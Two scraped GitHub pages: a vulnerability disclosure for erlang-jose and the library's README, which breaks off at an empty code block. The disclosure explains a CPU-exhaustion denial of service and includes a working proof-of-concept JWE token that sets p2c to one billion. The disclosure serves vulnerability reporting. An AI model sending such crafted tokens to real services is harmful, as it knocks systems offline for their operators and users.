=== Content from github.com_8c78bc80_20250110_123327.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FP3ngu1nW%2FCVE_Request%2Fblob%2Fmain%2Ferlang-jose.md)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FP3ngu1nW%2FCVE_Request%2Fblob%2Fmain%2Ferlang-jose.md)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=P3ngu1nW%2FCVE_Request)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[P3ngu1nW](/P3ngu1nW)
/
**[CVE\_Request](/P3ngu1nW/CVE_Request)**
Public

* [Notifications](/login?return_to=%2FP3ngu1nW%2FCVE_Request) You must be signed in to change notification settings
* [Fork
  0](/login?return_to=%2FP3ngu1nW%2FCVE_Request)
* [Star
   1](/login?return_to=%2FP3ngu1nW%2FCVE_Request)

* [Code](/P3ngu1nW/CVE_Request)
* [Issues
  1](/P3ngu1nW/CVE_Request/issues)
* [Pull requests
  0](/P3ngu1nW/CVE_Request/pulls)
* [Actions](/P3ngu1nW/CVE_Request/actions)
* [Projects
  0](/P3ngu1nW/CVE_Request/projects)
* [Security](/P3ngu1nW/CVE_Request/security)
* [Insights](/P3ngu1nW/CVE_Request/pulse)

Additional navigation options

* [Code](/P3ngu1nW/CVE_Request)
* [Issues](/P3ngu1nW/CVE_Request/issues)
* [Pull requests](/P3ngu1nW/CVE_Request/pulls)
* [Actions](/P3ngu1nW/CVE_Request/actions)
* [Projects](/P3ngu1nW/CVE_Request/projects)
* [Security](/P3ngu1nW/CVE_Request/security)
* [Insights](/P3ngu1nW/CVE_Request/pulse)

## Files

 main
## Breadcrumbs

1. [CVE\_Request](/P3ngu1nW/CVE_Request/tree/main)
/
# erlang-jose.md

 Blame  Blame
## Latest commit

## History

[History](/P3ngu1nW/CVE_Request/commits/main/erlang-jose.md)22 lines (13 loc) · 1.22 KB main
## Breadcrumbs

1. [CVE\_Request](/P3ngu1nW/CVE_Request/tree/main)
/
# erlang-jose.md

Top
## File metadata and controls

* Preview
* Code
* Blame

22 lines (13 loc) · 1.22 KB[Raw](https://github.com/P3ngu1nW/CVE_Request/raw/refs/heads/main/erlang-jose.md)
# erlang-jose

## Summary

erlang-jose (aka JOSE for Erlang and Elixir) through 1.11.6 allow attackers to cause a denial of service (CPU consumption) via a large p2c (aka PBES2 Count) value in a JOSE header.

## Description

potatosalad/erlang-jose is a Erlang module implementing JOSE(Json Object Signing and Encrypting) technologies.

The JWE key management algorithms based on PBKDF2 require a JOSE Header Parameter called p2c (PBES2 Count). This parameter dictates the number of PBKDF2 iterations needed to derive a CEK wrapping key. Its primary purpose is to intentionally slow down the key derivation function, making password brute-force and dictionary attacks more resource- intensive.

Therefore, if an attacker sets the p2c parameter in JWE to a very large number, it can cause a lot of computational consumption, resulting in a DOS attack.

## Poc

```
iex(1)> jwk_secret = JOSE.JWK.from_oct("secret")
#JOSE.JWK<keys: :undefined, fields: %{}, ...>
iex(2)> JOSE.JWE.block_decrypt(jwk_secret, "eyJhbGciOiJQQkVTMi1IUzI1NitBMTI4S1ciLCJlbmMiOiJBMTI4R0NNIiwicDJjIjoxMDAwMDAwMDAwLCJwMnMiOiJmbmcxUVJNU1ljWDljb2s4RUhHWWhnIn0.YZBzMWbcndBWvOjf4c3R2oPtRsRqSKDc.rv6Qc-lKE0WA6-MI.bHE.hNkOsML8iJJWbd1KwDEGHQ") |> elem(0)
```

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_53235d25_20250110_123328.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fpotatosalad%2Ferlang-jose)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fpotatosalad%2Ferlang-jose)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=potatosalad%2Ferlang-jose)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[potatosalad](/potatosalad)
/
**[erlang-jose](/potatosalad/erlang-jose)**
Public

* [Notifications](/login?return_to=%2Fpotatosalad%2Ferlang-jose) You must be signed in to change notification settings
* [Fork
  105](/login?return_to=%2Fpotatosalad%2Ferlang-jose)
* [Star
   314](/login?return_to=%2Fpotatosalad%2Ferlang-jose)

JSON Object Signing and Encryption (JOSE) for Erlang and Elixir

[hexdocs.pm/jose](http://hexdocs.pm/jose "http://hexdocs.pm/jose")

### License

[MIT license](/potatosalad/erlang-jose/blob/main/LICENSE.md)

[314
stars](/potatosalad/erlang-jose/stargazers) [105
forks](/potatosalad/erlang-jose/forks) [Branches](/potatosalad/erlang-jose/branches) [Tags](/potatosalad/erlang-jose/tags) [Activity](/potatosalad/erlang-jose/activity)
 [Star](/login?return_to=%2Fpotatosalad%2Ferlang-jose)

 [Notifications](/login?return_to=%2Fpotatosalad%2Ferlang-jose) You must be signed in to change notification settings

* [Code](/potatosalad/erlang-jose)
* [Issues
  29](/potatosalad/erlang-jose/issues)
* [Pull requests
  4](/potatosalad/erlang-jose/pulls)
* [Actions](/potatosalad/erlang-jose/actions)
* [Projects
  2](/potatosalad/erlang-jose/projects)
* [Wiki](/potatosalad/erlang-jose/wiki)
* [Security](/potatosalad/erlang-jose/security)
* [Insights](/potatosalad/erlang-jose/pulse)

Additional navigation options

* [Code](/potatosalad/erlang-jose)
* [Issues](/potatosalad/erlang-jose/issues)
* [Pull requests](/potatosalad/erlang-jose/pulls)
* [Actions](/potatosalad/erlang-jose/actions)
* [Projects](/potatosalad/erlang-jose/projects)
* [Wiki](/potatosalad/erlang-jose/wiki)
* [Security](/potatosalad/erlang-jose/security)
* [Insights](/potatosalad/erlang-jose/pulse)

# potatosalad/erlang-jose

    main[Branches](/potatosalad/erlang-jose/branches)[Tags](/potatosalad/erlang-jose/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[304 Commits](/potatosalad/erlang-jose/commits/main/) | | |
| [.github/workflows](/potatosalad/erlang-jose/tree/main/.github/workflows "This path skips through empty directories") | | [.github/workflows](/potatosalad/erlang-jose/tree/main/.github/workflows "This path skips through empty directories") |  |  |
| [codegen](/potatosalad/erlang-jose/tree/main/codegen "codegen") | | [codegen](/potatosalad/erlang-jose/tree/main/codegen "codegen") |  |  |
| [examples](/potatosalad/erlang-jose/tree/main/examples "examples") | | [examples](/potatosalad/erlang-jose/tree/main/examples "examples") |  |  |
| [include](/potatosalad/erlang-jose/tree/main/include "include") | | [include](/potatosalad/erlang-jose/tree/main/include "include") |  |  |
| [lib](/potatosalad/erlang-jose/tree/main/lib "lib") | | [lib](/potatosalad/erlang-jose/tree/main/lib "lib") |  |  |
| [priv](/potatosalad/erlang-jose/tree/main/priv "priv") | | [priv](/potatosalad/erlang-jose/tree/main/priv "priv") |  |  |
| [src](/potatosalad/erlang-jose/tree/main/src "src") | | [src](/potatosalad/erlang-jose/tree/main/src "src") |  |  |
| [test](/potatosalad/erlang-jose/tree/main/test "test") | | [test](/potatosalad/erlang-jose/tree/main/test "test") |  |  |
| [.dialyzer\_ignore.exs](/potatosalad/erlang-jose/blob/main/.dialyzer_ignore.exs ".dialyzer_ignore.exs") | | [.dialyzer\_ignore.exs](/potatosalad/erlang-jose/blob/main/.dialyzer_ignore.exs ".dialyzer_ignore.exs") |  |  |
| [.formatter.exs](/potatosalad/erlang-jose/blob/main/.formatter.exs ".formatter.exs") | | [.formatter.exs](/potatosalad/erlang-jose/blob/main/.formatter.exs ".formatter.exs") |  |  |
| [.gitignore](/potatosalad/erlang-jose/blob/main/.gitignore ".gitignore") | | [.gitignore](/potatosalad/erlang-jose/blob/main/.gitignore ".gitignore") |  |  |
| [ALGORITHMS.md](/potatosalad/erlang-jose/blob/main/ALGORITHMS.md "ALGORITHMS.md") | | [ALGORITHMS.md](/potatosalad/erlang-jose/blob/main/ALGORITHMS.md "ALGORITHMS.md") |  |  |
| [CHANGELOG.md](/potatosalad/erlang-jose/blob/main/CHANGELOG.md "CHANGELOG.md") | | [CHANGELOG.md](/potatosalad/erlang-jose/blob/main/CHANGELOG.md "CHANGELOG.md") |  |  |
| [LICENSE.md](/potatosalad/erlang-jose/blob/main/LICENSE.md "LICENSE.md") | | [LICENSE.md](/potatosalad/erlang-jose/blob/main/LICENSE.md "LICENSE.md") |  |  |
| [Makefile](/potatosalad/erlang-jose/blob/main/Makefile "Makefile") | | [Makefile](/potatosalad/erlang-jose/blob/main/Makefile "Makefile") |  |  |
| [README.md](/potatosalad/erlang-jose/blob/main/README.md "README.md") | | [README.md](/potatosalad/erlang-jose/blob/main/README.md "README.md") |  |  |
| [build.config](/potatosalad/erlang-jose/blob/main/build.config "build.config") | | [build.config](/potatosalad/erlang-jose/blob/main/build.config "build.config") |  |  |
| [erlang.mk](/potatosalad/erlang-jose/blob/main/erlang.mk "erlang.mk") | | [erlang.mk](/potatosalad/erlang-jose/blob/main/erlang.mk "erlang.mk") |  |  |
| [mix.exs](/potatosalad/erlang-jose/blob/main/mix.exs "mix.exs") | | [mix.exs](/potatosalad/erlang-jose/blob/main/mix.exs "mix.exs") |  |  |
| [mix.lock](/potatosalad/erlang-jose/blob/main/mix.lock "mix.lock") | | [mix.lock](/potatosalad/erlang-jose/blob/main/mix.lock "mix.lock") |  |  |
| [rebar.config](/potatosalad/erlang-jose/blob/main/rebar.config "rebar.config") | | [rebar.config](/potatosalad/erlang-jose/blob/main/rebar.config "rebar.config") |  |  |
| [rebar.lock](/potatosalad/erlang-jose/blob/main/rebar.lock "rebar.lock") | | [rebar.lock](/potatosalad/erlang-jose/blob/main/rebar.lock "rebar.lock") |  |  |
| View all files | | |

## Repository files navigation

* README
* MIT license
# JOSE

[![Build Status](https://github.com/potatosalad/erlang-jose/actions/workflows/main.yml/badge.svg?branch=main)](https://github.com/potatosalad/erlang-jose/actions) [![Hex.pm](https://camo.githubusercontent.com/a5caf45eb5c5b782d9987b31ada4d66a9bab8054f545fdbc7d8968d5a367d744/68747470733a2f2f696d672e736869656c64732e696f2f686578706d2f762f6a6f73652e737667)](https://hex.pm/packages/jose)

JSON Object Signing and Encryption (JOSE) for Erlang and Elixir.

## Installation

Add `jose` to your project's dependencies in `mix.exs`

```
defp deps() do
  [
    {:jose, "~> 1.11"}
  ]
end
```

If you are using deployment tools (`exrm`, etc.) and your app depends
on `jose` directly, you will need to include `jose` in your
applications list in `mix.exs` to ensure they get compiled into your
release:

```
def application() do
  [
    mod: {YourApp, []},
    applications: [:jose]
  ]
end
```

Add `jose` to your project's dependencies in your `Makefile` for [`erlang.mk`](https://github.com/ninenines/erlang.mk) or the following to your `rebar.config`

```
{deps, [
  jose
]}.
```

#### JSON Encoder/Decoder

You will also need to specify either [jiffy](https://github.com/davisp/jiffy), [jsone](https://github.com/sile/jsone), [jsx](https://github.com/talentdeficit/jsx), [ojson](https://github.com/potatosalad/erlang-ojson), [Poison](https://github.com/devinus/poison), or [Jason](https://github.com/michalmuskala/jason) as a dependency.

For example, with Elixir and `mix.exs`

```
defp deps() do
  [
    {:jose, "~> 1.11"},
    {:jason, "~> 1.4"}
  ]
end
```

Or with Erlang and `rebar.config`

```
{deps, [
  jose,
  ojson
]}.
```

`jose` will attempt to find a suitable JSON encoder/decoder and will try to use (in order) ojson, Jason, Poison, jiffy, jsone, or jsx.

You may also specify a different `json_module` as an application environment variable to `jose` or by using `jose:json_module/1` or `JOSE.json_module/1`.

#### ChaCha20/Poly1305 Support

ChaCha20/Poly1305 encryption and one-time message authentication functions are experimentally supported based on [RFC 7539](https://tools.ietf.org/html/rfc7539).

Fallback support for `ChaCha20/Poly1305` encryption and `Poly1305` signing is also provided. See [`crypto_fallback`](#cryptographic-algorithm-fallback) below.

External support is also provided by the following libraries:

* [libsodium](https://github.com/potatosalad/erlang-libsodium) - `ChaCha20/Poly1305` encryption and `Poly1305` signing

Other modules which implement the `jose_chacha20_poly1305` behavior may also be used as follows:

```
# ChaCha20/Poly1305
JOSE.chacha20_poly1305_module(:libsodium)                  # uses a fast Erlang port driver for libsodium
JOSE.chacha20_poly1305_module(:jose_jwa_chacha20_poly1305) # uses the pure Erlang implementation (slow)
```

#### Curve25519 and Curve448 Support

Curve25519 and Curve448 and their associated signing/key exchange functions are supported now that [RFC 8037](https://tools.ietf.org/html/rfc8037) has been published.

Fallback support for `Ed25519`, `Ed25519ph`, `Ed448`, `Ed448ph`, `X25519`, and `X448` is provided. See [`crypto_fallback`](#cryptographic-algorithm-fallback) below.

External support is also provided by the following libraries:

* [libdecaf](https://github.com/potatosalad/erlang-libdecaf) - `Ed25519`, `Ed25519ph`, `Ed448`, `Ed448ph`, `X25519`, `X448`
* [libsodium](https://github.com/potatosalad/erlang-libsodium) - `Ed25519`, `Ed25519ph`, `X25519`

If both libraries are present, libdecaf will be used by default. Other modules which implement the `jose_curve25519` or `jose_curve448` behaviors may also be used as follows:

```
# Curve25519
JOSE.curve25519_module(:libdecaf)            # uses a fast Erlang NIF for libdecaf
JOSE.curve25519_module(:jose_jwa_curve25519) # uses the pure Erlang implementation (slow)

# Curve448
JOSE.curve448_module(:libdecaf)          # uses a fast Erlang NIF for libdecaf
JOSE.curve448_module(:jose_jwa_curve448) # uses the pure Erlang implementation (slow)
```

#### SHA-3 Support

SHA-3 is experimentally supported for use with `Ed448` and `Ed448ph` signing functions.

Fallback support for SHA-3 is provided. See [`crypto_fallback`](#cryptographic-algorithm-fallback) below.

External support for SHA-3 is provided by the [keccakf1600](https://github.com/potatosalad/erlang-keccakf1600) and [libdecaf](https://github.com/potatosalad/erlang-libdecaf) libraries. If present, keccakf1600 will be used by default. Other modules which implement the `jose_sha3` behaviors may also be used as follows:

```
JOSE.sha3_module(:keccakf1600)   # uses a NIF written in C with timeslice reductions
JOSE.sha3_module(:jose_jwa_sha3) # uses the pure Erlang implementation (slow)
```

#### Cryptographic Algorithm Fallback

`jose` strives to support [all](#algorithm-support) of the cryptographic algorithms specified in the [JOSE RFCs](https://tools.ietf.org/wg/jose/).

However, not all of the required algorithms are supported natively by Erlang/Elixir. For algorithms unsupported by the native [`crypto`](http://www.erlang.org/doc/man/crypto.html) and [`public_key`](http://www.erlang.org/doc/man/public_key.html), `jose` has a pure Erlang implementation that may be used as a fallback.

See [ALGORITHMS.md](https://github.com/potatosalad/erlang-jose/blob/main/ALGORITHMS.md) for more information about algorithm support for specific OTP versions.

By default, the algorithm fallback is disabled, but can be enabled by setting the `crypto_fallback` application environment variable for `jose` to `true` or by calling `jose:crypto_fallback/1` or `JOSE.crypto_fallback/1` with `true`.

You may also review which algorithms are currently supported with the `jose_jwa:supports/0` or `JOSE.JWA.supports/0` functions. For example, on Elixir 1.9.4 and OTP 22:

```
# crypto_fallback defaults to false
JOSE.JWA.supports()

[
  {:jwe,
   {:alg,
    ["A128GCMKW", "A128KW", "A192GCMKW", "A192KW", "A256GCMKW", "A256KW",
     "C20PKW", "ECDH-1PU", "ECDH-1PU+A128GCMKW", "ECDH-1PU+A128KW",
     "ECDH-1PU+A192GCMKW", "ECDH-1PU+A192KW", "ECDH-1PU+A256GCMKW",
     "ECDH-1PU+A256KW", "ECDH-1PU+C20PKW", "ECDH-1PU+XC20PKW", "ECDH-ES",
     "ECDH-ES+A128GCMKW", "ECDH-ES+A128KW", "ECDH-ES+A192GCMKW",
     "ECDH-ES+A192KW", "ECDH-ES+A256GCMKW", "ECDH-ES+A256KW", "ECDH-ES+C20PKW",
     "ECDH-ES+XC20PKW", "ECDH-SS", "ECDH-SS+A128GCMKW", "ECDH-SS+A128KW",
     "ECDH-SS+A192GCMKW", "ECDH-SS+A192KW", "ECDH-SS+A256GCMKW",
     "ECDH-SS+A256KW", "ECDH-SS+C20PKW", "ECDH-SS+XC20PKW",
     "PBES2-HS256+A128GCMKW", "PBES2-HS256+A128KW", "PBES2-HS384+A192GCMKW",
     "PBES2-HS384+A192KW", "PBES2-HS512+A256GCMKW", "PBES2-HS512+A256KW",
     "PBES2-HS512+C20PKW", "PBES2-HS512+XC20PKW", "RSA-OAEP", "RSA-OAEP-256",
     "RSA1_5", "XC20PKW", "dir"]},
   {:enc,
    ["A128CBC-HS256", "A128GCM", "A192CBC-HS384", "A192GCM", "A256CBC-HS512",
     "A256GCM", "C20P", "XC20P"]}, {:zip, ["DEF"]}},
  {:jwk, {:kty, ["EC", "OKP", "RSA", "oct"]},
   {:kty_OKP_crv,
    ["Ed25519", "Ed25519ph", "Ed448", "Ed448ph", "X25519", "X448"]}},
  {:jws,
   {:alg,
    ["ES256", "ES256K", "ES384", "ES512", "Ed25519", "Ed25519ph", "Ed448",
     "Ed448ph", "EdDSA", "HS256", "HS384", "HS512", "PS256", "PS384", "PS512",
     "Poly1305", "RS1", "RS256", "RS384", "RS512"]}}
]

# setting crypto_fallback to true
JOSE.crypto_fallback(true)

# additional algorithms are now available for use
JOSE.JWA.supports()

[
  {:jwe,
   {:alg,
    ["A128GCMKW", "A128KW", "A192GCMKW", "A192KW", "A256GCMKW", "A256KW",
     "C20PKW", "ECDH-1PU", "ECDH-1PU+A128GCMKW", "ECDH-1PU+A128KW",
     "ECDH-1PU+A192GCMKW", "ECDH-1PU+A192KW", "ECDH-1PU+A256GCMKW",
     "ECDH-1PU+A256KW", "ECDH-1PU+C20PKW", "ECDH-1PU+XC20PKW", "ECDH-ES",
     "ECDH-ES+A128GCMKW", "ECDH-ES+A128KW", "ECDH-ES+A192GCMKW",
     "ECDH-ES+A192KW", "ECDH-ES+A256GCMKW", "ECDH-ES+A256KW", "ECDH-ES+C20PKW",
     "ECDH-ES+XC20PKW", "ECDH-SS", "ECDH-SS+A128GCMKW", "ECDH-SS+A128KW",
     "ECDH-SS+A192GCMKW", "ECDH-SS+A192KW", "ECDH-SS+A256GCMKW",
     "ECDH-SS+A256KW", "ECDH-SS+C20PKW", "ECDH-SS+XC20PKW",
     "PBES2-HS256+A128GCMKW", "PBES2-HS256+A128KW", "PBES2-HS384+A192GCMKW",
     "PBES2-HS384+A192KW", "PBES2-HS512+A256GCMKW", "PBES2-HS512+A256KW",
     "PBES2-HS512+C20PKW", "PBES2-HS512+XC20PKW", "RSA-OAEP", "RSA-OAEP-256",
     "RSA1_5", "XC20PKW", "dir"]},
   {:enc,
    ["A128CBC-HS256", "A128GCM", "A192CBC-HS384", "A192GCM", "A256CBC-HS512",
     "A256GCM", "C20P", "XC20P"]}, {:zip, ["DEF"]}},
  {:jwk, {:kty, ["EC", "OKP", "RSA", "oct"]},
   {:kty_OKP_crv,
    ["Ed25519", "Ed25519ph", "Ed448", "Ed448ph", "X25519", "X448"]}},
  {:jws,
   {:alg,
    ["ES256", "ES256K", "ES384", "ES512", "Ed25519", "Ed25519ph", "Ed448",
     "Ed448ph", "EdDSA", "HS256", "HS384", "HS512", "PS256", "PS384", "PS512",
     "Poly1305", "RS1", "RS256", "RS384", "RS512"]}}
]
```

#### Unsecured Signing Vulnerability

The [`"none"`](https://tools.ietf.org/html/rfc7515#appendix-A.5) signing algorithm is disabled by default to prevent accidental verification of empty signatures (read about the vulnerability [here](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)).

If you want to further restrict the signature algorithms allowed for a token, use `JOSE.JWT.verify_strict/3`:

```
# Signed Compact JSON Web Token (JWT) with HS256
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjEzMDA4MTkzODAsImh0dHA6Ly9leGFtcGxlLmNvbS9pc19yb290Ijp0cnVlLCJpc3MiOiJqb2UifQ.shLcxOl_HBBsOTvPnskfIlxHUibPN7Y9T4LhPB-iBwM"

# JSON Web Key (JWK)
jwk = %{
  "kty" => "oct",
  "k" => :jose_base64url.encode("symmetric key")
}

{verified, _, _} = JOSE.JWT.verify_strict(jwk, ["HS256"], token)
# {true, _, _}

{verified, _, _} = JOSE.JWT.verify_strict(jwk, ["RS256"], token)
# {false, _, _}
```

If you need to inspect the contents of a JSON Web token (JWT) prior to verifying it, use `JOSE.JWT.peek_payload/1` or `JOSE.JWT.peek_protected/1`:

```
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjEzMDA4MTkzODAsImh0dHA6Ly9leGFtcGxlLmNvbS9pc19yb290Ijp0cnVlLCJpc3MiOiJqb2UifQ.shLcxOl_HBBsOTvPnskfIlxHUibPN7Y9T4LhPB-iBwM"

payload = JOSE.JWT.peek_payload(token)
# %JOSE.JWT{fields: %{"exp" => 1300819380, "http://example.com/is_root" => true,
#    "iss" => "joe"}}

protected = JOSE.JWT.peek_protected(token)
# %JOSE.JWS{alg: {:jose_jws_alg_hmac, {:jose_jws_alg_hmac, :sha256}},
#  b64: :undefined, fields: %{"typ" => "JWT"}}

# If you want to inspect the JSON, you can convert it back to a regular map:
{_, protected_map} = JOSE.JWS.to_map(protected)
# {_, %{"alg" => "HS256", "typ" => "JWT"}}
```

You may also enable the `"none"` algorithm as an application environment variable for `jose` or by using `jose:unsecured_signing/1` or `JOSE.unsecured_signing/1`.

```
# unsecured_signing defaults to false
JOSE.JWA.supports[:jws]

{:alg,
 ["ES256", "ES256K", "ES384", "ES512", "Ed25519", "Ed25519ph", "Ed448",
  "Ed448ph", "EdDSA", "HS256", "HS384", "HS512", "PS256", "PS384", "PS512",
  "Poly1305", "RS1", "RS256", "RS384", "RS512"]}

# setting unsecured_signing to true
JOSE.unsecured_signing(true)

# the "none" algorithm is now available for use
JOSE.JWA.supports[:jws]

{:alg,
 ["ES256", "ES256K", "ES384", "ES512", "Ed25519", "Ed25519ph", "Ed448",
  "Ed448ph", "EdDSA", "HS256", "HS384", "HS512", "PS256", "PS384", "PS512",
  "Poly1305", "RS1", "RS256", "RS384", "RS512", "none"]}
```

## Usage

##### JSON Web Signature (JWS) of JSON Web Token (JWT) using HMAC using SHA-256 (HS256) with JSON Web Key (JWK)

*Elixir*

```
# JSON Web Key (JWK)
jwk = %{
  "kty" => "oct",
  "k" => :jose_base64url.encode("symmetric key")
}

# JSON Web Signature (JWS)
jws = %{
  "alg" => "HS256"
}

# JSON Web Token (JWT)
jwt = %{
  "iss" => "joe",
  "exp" => 1300819380,
  "http://example.com/is_root" => true
}

signed = JOSE.JWT.sign(jwk, jws, jwt)
# {%{alg: :jose_jws_alg_hmac},
#  %{"payload" => "eyJleHAiOjEzMDA4MTkzODAsImh0dHA6Ly9leGFtcGxlLmNvbS9pc19yb290Ijp0cnVlLCJpc3MiOiJqb2UifQ",
#    "protected" => "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9",
#    "signature" => "shLcxOl_HBBsOTvPnskfIlxHUibPN7Y9T4LhPB-iBwM"}}

compact_signed = JOSE.JWS.compact(signed)
# {%{alg: :jose_jws_alg_hmac},
#  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjEzMDA4MTkzODAsImh0dHA6Ly9leGFtcGxlLmNvbS9pc19yb290Ijp0cnVlLCJpc3MiOiJqb2UifQ.shLcxOl_HBBsOTvPnskfIlxHUibPN7Y9T4LhPB-iBwM"}

verified = JOSE.JWT.verify(jwk, compact_signed)
# {true,
#  %JOSE.JWT{fields: %{"exp" => 1300819380, "http://example.com/is_root" => true,
#     "iss" => "joe"}},
#  %JOSE.JWS{alg: {:jose_jws_alg_hmac, :HS256}, b64: :undefined,
#   fields: %{"typ" => "JWT"}}}

verified == JOSE.JWT.verify(jwk, signed)
# true
```

*Erlang*

```
